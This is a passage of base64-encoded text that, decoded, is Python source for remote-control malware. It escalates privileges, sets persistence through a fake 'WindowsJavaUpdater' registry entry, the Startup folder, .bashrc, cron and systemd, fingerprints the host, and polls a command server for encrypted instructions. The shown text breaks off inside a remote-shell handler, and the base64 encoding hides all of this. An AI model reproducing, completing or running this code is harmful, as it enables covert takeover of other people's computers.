wuc2hlbGwzMi5Jc1VzZXJBbkFkbWluKCkgIT0gMToNCiAgICAgICAgICAgIHByaW50KCJub3QgYWRtaW4iKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCgyKQ0KICAgICAgICAgICAgcHJpbnQoImF0dGVtcHRpbmcgdG8gb2J0YWluIGFkbWluIikNCg0KICAgICAgICAgICAgcmVzID0gY3R5cGVzLndpbmRsbC5zaGVsbDMyLlNoZWxsRXhlY3V0ZVcoTm9uZSwgInJ1bmFzIiwgc3lzLmV4ZWN1dGFibGUsICIgIi5qb2luKHN5cy5hcmd2KSwgTm9uZSwgMSkNCg0KICAgICAgICAgICAgaWYgcmVzID4gMzI6DQogICAgICAgICAgICAgICAgcHJpbnQoImFkbWluIG9idGFpbmVkIC0gbGF1bmNoaW5nIHN0YXJ0dXAiKQ0KICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgcHJpbnQoImFkbWluIHN0aWxsIG5vdCBvYnRhaW5lZCAtIHVzaW5nIG90aGVyIG1ldGhvZCIpDQogICAgICAgICAgICAgICAgcHJpbnQoIkFkbWluIERlbmllZCIpDQoNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCJBZG1pbiBhbHJlYWR5IG9idGFpbmVkIC0gbGF1bmNoaW5nIHN0YXJ0dXAiKQ0KDQogICAgICAgIA0KDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICByZWdpc3RyeV9rZXkgPSB3aW5yZWcuT3BlbktleSh3aW5yZWcuSEtFWV9MT0NBTF9NQUNISU5FLCByIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFxXaW5kb3dzSmF2YVVwZGF0ZXIiKQ0KICAgICAgICAgICAgICAgIHByaW50KCJSZWdpc3RyeSBrZXkgJ1dpbmRvd3NKYXZhVXBkYXRlcicgZXhpc3RzLiIpDQogICAgICAgICAgICAgICAgd2lucmVnLkNsb3NlS2V5KHJlZ2lzdHJ5X2tleSkNCiAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOg0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHByaW50KCJSZWdpc3RyeSBrZXkgJ1dpbmRvd3NKYXZhVXBkYXRlcicgZG9lcyBub3QgZXhpc3QgLSBjcmVhdGluZyIpDQogICAgICAgICAgICAgICAgdmFsdWVfbmFtZSA9ICJXaW5kb3dzSmF2YVVwZGF0ZXIiIA0KICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUgIA0KICAgICAgICAgICAgICAgIGtleV9wYXRoID0gciJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIA0KICAgICAgICAgICAgICAgIHdpdGggd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfTE9DQUxfTUFDSElORSwga2V5X3BhdGgsIDAsIHdpbnJlZy5LRVlfU0VUX1ZBTFVFKSBhcyBrZXk6DQogICAgICAgICAgICAgICAgICAgIHdpbnJlZy5TZXRWYWx1ZUV4KGtleSwgdmFsdWVfbmFtZSwgMCwgd2lucmVnLlJFR19TWiwgZmlsZV9wYXRoKQ0KDQogICAgICAgICAgICAgICAgcHJpbnQoZiJBZGRlZCB7dmFsdWVfbmFtZX0gdG8gc3RhcnR1cCByZWdpc3RyeSB3aXRoIGZpbGUgcGF0aDoge2ZpbGVfcGF0aH0iKQ0KDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgRToNCiAgICAgICAgICAgIHByaW50KCJFcnJvciBpbiByZWc6ICIsRSkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMTApDQogICAgICAgICAgICBwYXNzDQoNCiAgDQogICAgZGVmIHN0YXJ0dXBfZm9sZGVyKCk6DQogICAgICAgIA0KICAgICAgICBzY3JpcHRfcGF0aCA9IHN5cy5hcmd2WzBdDQogICAgICAgIGlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOg0KICAgICAgICAgICAgc2NyaXB0X3BhdGggPSBvcy5wYXRoLmFic3BhdGgob3MucGF0aC5qb2luKHN5cy5fTUVJUEFTUywgc3lzLmFyZ3ZbMF0pKQ0KICAgICAgICBmZXh0ID0gb3MucGF0aC5zcGxpdGV4dChzY3JpcHRfcGF0aClbMV0NCiAgICAgICAgDQogICAgICAgIHN0YXJ0dXBfZm9sZGVyID0gb3MucGF0aC5qb2luKG9zLmdldGVudignQVBQREFUQScpLCAnTWljcm9zb2Z0JywgJ1dpbmRvd3MnLCAnU3RhcnQgTWVudScsICdQcm9ncmFtcycsICdTdGFydHVwJykNCg0KICAgICAgICBzZXAgPSBvcy5wYXRoLnNlcA0KICAgICAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkNCg0KICAgICAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToNCiAgICAgICAgICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKHN5cy5leGVjdXRhYmxlKQ0KDQogICAgICAgIHNjcmlwdF9kaXJlY3RvcnkgPSBvcy5wYXRoLmRpcm5hbWUoc2NyaXB0X3BhdGgpDQogICAgICAgIHNjcmlwdF9maWxlbmFtZSA9IG9zLnBhdGguYmFzZW5hbWUoc2NyaXB0X3BhdGgpDQogICAgICAgIHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUgPSBzY3JpcHRfZGlyZWN0b3J5ICsgc2VwICsgc2NyaXB0X2ZpbGVuYW1lDQogICAgICAgIHByaW50KHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUpDQoNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgc2h1dGlsLmNvcHkoc2NyaXB0X2RpcmVjdG9yeV9maWxlbmFtZSwgc3RhcnR1cF9mb2xkZXIpDQogICAgICAgICAgICBwcmludChmJ1N1Y2Nlc3NmdWxseSBjb3BpZWQge3NjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWV9IHRvIHRoZSBzdGFydHVwIGZvbGRlci4nKQ0KDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KGYnRXJyb3I6IHtlfScpDQogICAgICAgICAgICB0aW1lLnNsZWVwKDEwKQ0KICAgICAgICAgICAgcGFzcw0KDQogICAgICAgIHN0YXJ0dXBfZiA9IG9zLnBhdGguam9pbihvcy5nZXRlbnYoJ0FQUERBVEEnKSwgJ01pY3Jvc29mdCcsICdXaW5kb3dzJywgJ1N0YXJ0IE1lbnUnLCAnUHJvZ3JhbXMnLCAnU3RhcnR1cCcpDQogICAgICAgIHN0YXJ0dXBfc2NyaXB0X3BhdGggPSBzdGFydHVwX2YgKyBzZXAgKyBzY3JpcHRfZmlsZW5hbWUNCiAgICAgICAgcHJpbnQoZiJTY3JpcHQgcGF0aDoge3NjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWV9IikNCiAgICAgICAgcHJpbnQoZiJTdGFydHVwIGZvbGRlciBwYXRoOiB7c3RhcnR1cF9zY3JpcHRfcGF0aH0iKQ0KDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHN0YXJ0dXBfc2NyaXB0X3BhdGgpOg0KICAgICAgICAgICAgcHJpbnQoZiJUaGUgc2NyaXB0IGlzIGFscmVhZHkgaW4gdGhlIFN0YXJ0dXAgZm9sZGVyOiB7c3RhcnR1cF9zY3JpcHRfcGF0aH0iKQ0KICAgICAgICAgICAgcGFzcw0KICAgICAgICANCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KGYic2NyaXB0IGlzIE5PVCBpbiB0aGUgU3RhcnR1cCBmb2xkZXIuIGFkZGluZy4uLiIpDQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIGN0eXBlcy53aW5kbGwuc2hlbGwzMi5Jc1VzZXJBbkFkbWluKCkgIT0gMToNCiAgICAgICAgICAgICAgICBwcmludCgibm90IGFkbWluIikNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDIpDQogICAgICAgICAgICAgICAgcHJpbnQoImF0dGVtcHRpbmcgdG8gb2J0YWluIGFkbWluIikNCg0KICAgICAgICAgICAgICAgIHJlcyA9IGN0eXBlcy53aW5kbGwuc2hlbGwzMi5TaGVsbEV4ZWN1dGVXKE5vbmUsICJydW5hcyIsIHN5cy5leGVjdXRhYmxlLCAiICIuam9pbihzeXMuYXJndiksIE5vbmUsIDEpDQoNCiAgICAgICAgICAgICAgICBpZiByZXMgPiAzMjoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoImFkbWluIG9idGFpbmVkIC0gbGF1bmNoaW5nIHN0YXJ0dXAiKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIHByaW50KCJhZG1pbiBzdGlsbCBub3Qgb2J0YWluZWQgLSB1c2luZyBvdGhlciBtZXRob2QiKQ0KICAgICAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgcHJpbnQoIkFkbWluIGFscmVhZHkgb2J0YWluZWQgLSBsYXVuY2hpbmcgc3RhcnR1cCIpDQoNCg0KICAgIHRyeToNCiAgICAgICAgDQogICAgICAgIHN0YXJ0dXBfZm9sZGVyKCkNCiAgICAgICAgcHJpbnQoIlN0YXJ0dXAgZm9sZGVyIHN1Y2Nlc3NmdWwgLSAiKQ0KICAgICAgICANCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIEU6DQogICAgICAgIA0KICAgICAgICBwcmludCgiRXJyb3IgaW4gZm9sZGVyIHN0YXJ0dXA6ICIsRSkNCiAgICAgICAgdGltZS5zbGVlcCg1KQ0KICAgICAgICBwcmludCgiQXR0ZW1wdGluZyBSZWcgYmFja2Rvb3IuLi4iKQ0KICAgICAgICB0aW1lLnNsZWVwKDUpDQogICAgICAgIHJlZ19rZXkoKQ0KICAgICAgICBwYXNzDQoNCmlmIG9wZXJhdGluZ19zeXN0ZW0gPT0gJ0xpbnV4JyBvciBvcGVyYXRpbmdfc3lzdGVtID09ICdMaW51eDInOg0KDQogICAgdHJ5Og0KDQogICAgICAgIHByaW50KCJzdGFydGluZyBsaW51eCBwZXJzaXN0IikNCg0KICAgICAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkNCiAgICAgICAgc3RhcnR1cF9wYXRoID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+Ly5jb25maWcvc3RhcnR1cF9zY3JpcHRfYmFzaHJjLnB5IikNCg0KICAgICAgICBzaHV0aWwuY29weShzY3JpcHRfcGF0aCwgc3RhcnR1cF9wYXRoKQ0KICAgICAgICBvcy5jaG1vZChzdGFydHVwX3BhdGgsIDBvNzU1KQ0KDQogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLmJhc2hyYyIpLCAiYSIpIGFzIGJhc2hyYzoNCiAgICAgICAgICAgIGJhc2hyYy53cml0ZShmIlxuIyBBZGQgdG8gc3RhcnR1cFxue3N0YXJ0dXBfcGF0aH0gJlxuIikNCg0KDQogICAgICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKHN5cy5hcmd2WzBdKQ0KICAgICAgICBzdGFydHVwX3BhdGggPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLmNvbmZpZy9zdGFydHVwX3NjcmlwdF9jcm9udGFiLnB5IikNCg0KICAgICAgICBzaHV0aWwuY29weShzY3JpcHRfcGF0aCwgc3RhcnR1cF9wYXRoKQ0KICAgICAgICBvcy5jaG1vZChzdGFydHVwX3BhdGgsIDBvNzU1KQ0KDQogICAgICAgIG9zLnN5c3RlbShmJyhjcm9udGFiIC1sIDsgZWNobyAiQHJlYm9vdCB7c3RhcnR1cF9wYXRofSIpIHwgY3JvbnRhYiAtJykNCg0KDQogICAgICAgIHNjcmlwdF9wYXRoID0gb3MucGF0aC5hYnNwYXRoKHN5cy5hcmd2WzBdKQ0KICAgICAgICBzdGFydHVwX3BhdGggPSBvcy5wYXRoLmV4cGFuZHVzZXIoIn4vLmNvbmZpZy9zdGFydHVwX3NjcmlwdF9zeXN0ZW1kLnB5IikNCg0KICAgICAgICBzaHV0aWwuY29weShzY3JpcHRfcGF0aCwgc3RhcnR1cF9wYXRoKQ0KICAgICAgICBvcy5jaG1vZChzdGFydHVwX3BhdGgsIDBvNzU1KQ0KDQogICAgICAgIHN5c3RlbWRfc2VydmljZSA9IGYiIiJbVW5pdF0NCiAgICBEZXNjcmlwdGlvbj1NeSBTdGFydHVwIFNjcmlwdA0KDQogICAgW1NlcnZpY2VdDQogICAgVHlwZT1zaW1wbGUNCiAgICBFeGVjU3RhcnQ9e3N0YXJ0dXBfcGF0aH0NCg0KICAgIFtJbnN0YWxsXQ0KICAgIFdhbnRlZEJ5PWRlZmF1bHQudGFyZ2V0DQogICAgIiIiDQoNCiAgICAgICAgc3lzdGVtZF9zZXJ2aWNlX3BhdGggPSAiL2V0Yy9zeXN0ZW1kL3N5c3RlbS9zdGFydHVwX3NjcmlwdF9zeXN0ZW1kLnNlcnZpY2UiDQogICAgICAgIHdpdGggb3BlbihzeXN0ZW1kX3NlcnZpY2VfcGF0aCwgInciKSBhcyBzZXJ2aWNlX2ZpbGU6DQogICAgICAgICAgICBzZXJ2aWNlX2ZpbGUud3JpdGUoc3lzdGVtZF9zZXJ2aWNlKQ0KDQogICAgICAgICNlbmFibGUgYW5kIHN0YXJ0IHRoZSBzZXJ2aWNlDQogICAgICAgIA0KICAgICAgICBvcy5zeXN0ZW0oZiJzeXN0ZW1jdGwgZW5hYmxlIHN0YXJ0dXBfc2NyaXB0X3N5c3RlbWQuc2VydmljZSIpDQogICAgICAgIG9zLnN5c3RlbShmInN5c3RlbWN0bCBzdGFydCBzdGFydHVwX3NjcmlwdF9zeXN0ZW1kLnNlcnZpY2UiKQ0KDQogICAgICAgIHRpbWUuc2xlZXAoMikNCg0KICAgICAgICAjdHJ5IGFnYWluIGluY2FzZSBvZiBpbml0aWFsIHByaXZpbGFnZSBlcnJvcnMgb3Igc2xvdyBzdGFydA0KDQogICAgICAgIG9zLnN5c3RlbSgic3VkbyBzeXN0ZW1jdGwgZGFlbW9uLXJlbG9hZCIpDQogICAgICAgIG9zLnN5c3RlbSgic3VkbyBzeXN0ZW1jdGwgZW5hYmxlIHN0YXJ0dXBfc2NyaXB0X3N5c3RlbWQuc2VydmljZSIpDQogICAgICAgIG9zLnN5c3RlbSgic3VkbyBzeXN0ZW1jdGwgc3RhcnQgc3RhcnR1cF9zY3JpcHRfc3lzdGVtZC5zZXJ2aWNlIikNCiAgICAgICAgDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBFOg0KICAgICAgICBwcmludCgiRXJyb3IgaW4gcGVyc2lzdGFuY2U6ICIsRSkNCiAgICAgICAgcGFzcw0KDQogICAgIyBQYXJ0IG9mIHNjcmlwdCBvbmx5IHdvcmtzIG9uY2UgY29tcGxpZWQgaW50byBleGVjdXRhYmxlIGZvcm1hdCANCg0KDQogICAgDQpwcm9jZXNzb3JfaW5mbyA9IHBsYXRmb3JtLnByb2Nlc3NvcigpO3N5c3RlbV9pbmZvID0gcGxhdGZvcm0uc3lzdGVtKCk7cmVsZWFzZV9pbmZvID0gcGxhdGZvcm0ucmVsZWFzZSgpO2NvbmNhdGVuYXRlZF9pbmZvID0gZiJ7cHJvY2Vzc29yX2luZm99LXtzeXN0ZW1faW5mb30te3JlbGVhc2VfaW5mb30iDQp1bmlxdWVfZmluZ2VycHJpbnQgPSBoYXNobGliLnNoYTI1Nihjb25jYXRlbmF0ZWRfaW5mby5lbmNvZGUoKSkuaGV4ZGlnZXN0KClbOjhdDQoNCmN1cnJlbnRfZGF0ZXRpbWUgPSBkYXRldGltZS5ub3coKQ0KZm9ybWF0dGVkX2RhdGV0aW1lID0gY3VycmVudF9kYXRldGltZS5zdHJmdGltZSgiJWR0aCAlQiAlSTolTSAlcCIpDQoNCnVuYW1lID0gcGxhdGZvcm0udW5hbWUoKQ0Kc3lzdGVtID0gcGxhdGZvcm0uc3lzdGVtKCkNCmFyY2ggPSBwbGF0Zm9ybS5hcmNoaXRlY3R1cmUoKQ0KaG9zdG5hbWUgPSBzb2NrZXQuZ2V0aG9zdG5hbWUoKQ0KdmVyc2lvbiA9IHBsYXRmb3JtLnZlcnNpb24oKQ0KY3B1Y291bnQgPSBvcy5jcHVfY291bnQoKQ0KY3B1YnVpbGQgPSB1bmFtZS5tYWNoaW5lDQoNCnBsID0gc3lzdGVtKyIgIit2ZXJzaW9uKyIgIisiKCIrY3B1YnVpbGQrIikiDQoNCnNsID0gc3RyKHBsKQ0Kc2wgPSBzbC5yZXBsYWNlKCInIiwgIiIpLnJlcGxhY2UoIigiLCAiIikucmVwbGFjZSgiKSIsICIiKQ0KcHJpbnQoc2wpDQoNCnNlcCA9IG9zLnBhdGguc2VwDQpvcyA9IHNsDQoNCnNsZWVwID0gTm9uZQ0KDQpkZWYgc2QoKToNCg0KICAgICMgTmV0d29yayB0aHJvdHRsZSBhbmQgbG93ZXIgc3RyZXNzIG5ldHdvcmsgcmVxdWVzdHMgbm93IHNlbnQgaW4gImNodW5rcyINCg0KICAgIGdsb2JhbCBzbGVlcA0KDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgd2hpbGUgc2xlZXA6DQogICAgICAgICAgICBicmVhaw0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICAgICAgICAgICB1cmwgPSBzZW5kdG91cmwgKyAic2VydmVyLnBocCINCiAgICAgICAgICAgICAgICBoZWFkZXJzID0gew0KICAgICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6IHNsKyIsIFVuaXF1ZSBJRDogKCIrdW5pcXVlX2ZpbmdlcnByaW50KyIpIiwNCiAgICAgICAgICAgICAgICAgICAgIlJlZmVyZXIiOiBzZW5kdG91cmwsDQogICAgICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tR0IsZW4tVVM7cT0wLjksZW47cT0wLjgiDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHdpdGggcmVxdWVzdHMuZ2V0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBzdHJlYW09VHJ1ZSkgYXMgcmVzcG9uc2U6DQogICAgICAgICAgICAgICAgICAgIGZvciBjaHVuayBpbiByZXNwb25zZS5pdGVyX2NvbnRlbnQoY2h1bmtfc2l6ZT0xMjgpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2h1bms6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlJlY2VpdmVkIGNodW5rOiIsIGNodW5rLmRlY29kZSgndXRmLTgnKSkNCiAgICAgICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5SZXF1ZXN0RXhjZXB0aW9uOg0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkNCiAgICAgICAgICAgICAgICBwYXNzDQoNCmRlZiBtbigpOg0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGltcG9ydCBvczt0aW1lLnNsZWVwKDEpDQogICAgDQogICAgICAgICAgICBkZWYgZ2V0X2xpbmVzX2luX2NodW5rcyh1cmwsIGNodW5rX3NpemUpOg0KICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KHVybCwgc3RyZWFtPVRydWUpDQogICAgICAgICAgICAgICAgbGluZXMgPSBbXQ0KDQogICAgICAgICAgICAgICAgZm9yIGNodW5rIGluIHJlc3BvbnNlLml0ZXJfY29udGVudChjaHVua19zaXplPTEyOCk6DQogICAgICAgICAgICAgICAgICAgIGlmIGNodW5rOg0KICAgICAgICAgICAgICAgICAgICAgICAgbGluZXMuZXh0ZW5kKGNodW5rLmRlY29kZSgndXRmLTgnKS5zcGxpdGxpbmVzKCkpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIGxlbihsaW5lcykgPj0gY2h1bmtfc2l6ZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB5aWVsZCBsaW5lc1s6Y2h1bmtfc2l6ZV0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaW5lcyA9IGxpbmVzW2NodW5rX3NpemU6XQ0KICAgICAgICAgICAgICAgIGlmIGxpbmVzOg0KICAgICAgICAgICAgICAgICAgICB5aWVsZCBsaW5lcw0KDQogICAgICAgICAgICB1cmwgPSBzZW5kdG91cmwgKyAicGljby13aWZpLnR4dCINCiAgICAgICAgICAgIGNodW5rX3NpemUgPSAxMg0KDQogICAgICAgICAgICBmb3IgY2h1bmsgaW4gZ2V0X2xpbmVzX2luX2NodW5rcyh1cmwsIGNodW5rX3NpemUpOg0KICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIGNodW5rOg0KDQogICAgICAgICAgICAgICAgICAgIHByaW50KCJQcm9jZXNzZWQgbGluZToiLCBsaW5lKQ0KDQogICAgICAgICAgICAgICAgICAgICNyZWNpZXZlIGNvbW1hbmQgZW5jcnlwZWQNCg0KICAgICAgICAgICAgICAgICAgICB0ZXh0X3dpdGhfcXVvdGVzID0gc3RyKGxpbmUpDQogICAgICAgICAgICAgICAgICAgIHBhdHRlcm4gPSByIicoLio/KSciDQogICAgICAgICAgICAgICAgICAgIG1hdGNoZXMgPSByZS5maW5kYWxsKHBhdHRlcm4sIHRleHRfd2l0aF9xdW90ZXMpDQogICAgICAgICAgICAgICAgICAgIGZvciBtYXRjaCBpbiBtYXRjaGVzOg0KICAgICAgICAgICAgICAgICAgICAgICAgbGluZSA9IG1hdGNoDQoNCg0KICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfdGV4dCA9IGxpbmUNCg0KICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRfdGV4dCA9IHN0cihlbmNyeXB0ZWRfdGV4dCkNCg0KICAgIA0KICAgICAgICAgICAgICAgICAgICBwcmludCgiRU5DUllQVEVEIENPTU1BTkQ6IixlbmNyeXB0ZWRfdGV4dCkNCg0KDQogICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF90ZXh0ID0gIiINCiAgICAgICAgICAgICAgICAgICAga2V5X2xlbmd0aCA9IGxlbihkZWNyeXB0aW9uX2tleSkgI3Byb2Nlc3MgZGVjcnlwdGlvbiBjeXBoZXINCg0KDQogICAgICAgICAgICAgICAgICAgICNkZWNyeXB0IGNvbW1hbmQNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGkgPSAwDQogICAgICAgICAgICAgICAgICAgIGZvciBjaGFyIGluIGVuY3J5cHRlZF90ZXh0Og0KICAgICAgICAgICAgICAgICAgICAgICAga2V5X2NoYXIgPSBkZWNyeXB0aW9uX2tleVtpICUga2V5X2xlbmd0aF0NCiAgICAgICAgICAgICAgICAgICAgICAgIGkgKz0gMQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBjaGFyLmlzYWxwaGEoKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpc191cHBlciA9IGNoYXIuaXN1cHBlcigpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhcl9zaGlmdCA9IG9yZChjaGFyKSAtIG9yZCgnQScpIGlmIGlzX3VwcGVyIGVsc2Ugb3JkKGNoYXIpIC0gb3JkKCdhJykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXlfc2hpZnQgPSBvcmQoa2V5X2NoYXIpIC0gb3JkKCdBJykgaWYga2V5X2NoYXIuaXN1cHBlcigpIGVsc2Ugb3JkKGtleV9jaGFyKSAtIG9yZCgnYScpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfY2hhciA9IGNocigoKGNoYXJfc2hpZnQgLSBrZXlfc2hpZnQpICUgMjYpICsgb3JkKCdBJykgaWYgaXNfdXBwZXIgZWxzZSAoKGNoYXJfc2hpZnQgLSBrZXlfc2hpZnQpICUgMjYpICsgb3JkKCdhJykpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3RleHQgKz0gZGVjcnlwdGVkX2NoYXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgY2hhci5pc2RpZ2l0KCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhcl9zaGlmdCA9IGludChjaGFyKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtleV9zaGlmdCA9IGludChrZXlfY2hhciwgMzYpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfZGlnaXQgPSBzdHIoKGNoYXJfc2hpZnQgLSBrZXlfc2hpZnQpICUgMTApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3RleHQgKz0gZGVjcnlwdGVkX2RpZ2l0DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF90ZXh0ICs9IGNoYXINCg0KICAgICAgICAgICAgICAgICAgICBsaW5lID0gZGVjcnlwdGVkX3RleHQNCg0KICAgICAgICAgICAgICAgICAgICBwcmludCgiREVDUllQVEVEIENPTU1BTkQ6IixsaW5lKQ0KDQogICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IGxpbmU7c3RyaW5nID0gc3RyKHN0cmluZykNCiAgICAgICAgICAgICAgICAgICAgc3RyaW5nID0gc3RyaW5nLnJlcGxhY2UoIiciLCIiKQ0KICAgICAgICAgICAgICAgICAgICBmaW5kID0gc3RyaW5nDQogICAgICAgICAgICAgICAgICAgIHJlcyA9IHJlLmZpbmRhbGwocidcKC4qP1wpJywgc3RyaW5nKQ0KICAgICAgICAgICAgICAgICAgICBzdWx0ID0gc3RyKHJlcyk7c3RyaW5nID0gc3VsdDtzdHJpbmcgPSBzdHIoc3RyaW5nKQ0KICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiWyIsICIiKS5yZXBsYWNlKCJdIiwgIiIpLnJlcGxhY2UoIikiLCAiIikucmVwbGFjZSgiKCIsICIiKS5yZXBsYWNlKCInIiwgIiIpDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAiaXAiIGluIGZpbmQ6DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSBzdHJpbmcNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbnRpcCA9IHN0cmluZw0KDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChzZW50aXApDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG15aXAgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vYXBpLmlwaWZ5Lm9yZyIpLmNvbnRlbnQNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IG15aXANCiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cihzdHJpbmcpDQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHJpbmcucmVwbGFjZSgiYiIsICIiKS5yZXBsYWNlKCInIiwgIiIpDQogICAgICAgICAgICAgICAgICAgICAgICBteWlwID0gc3RyaW5nDQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KG15aXApDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbnRpcCA9PSBteWlwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1lID0gVHJ1ZQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoZmluZCkNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyYyA9IHJlLmZpbmRhbGwocidcWy4qP1xdJywgZmluZCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBicmMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgPSBzdHIoc3RyaW5nKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyA9IHN0cmluZy5yZXBsYWNlKCJdIiwgIiIpLnJlcGxhY2UoIlsiLCAiIikucmVwbGFjZSgiJyIsICIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyY2sgPSBzdHJpbmcNCg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgIlNIRUxMLUVYVC1UQ1AiIGluIGZpbmQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChicmNrKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlucHV0X3N0cmluZyA9IGJyY2sNCiAgICAgICAgI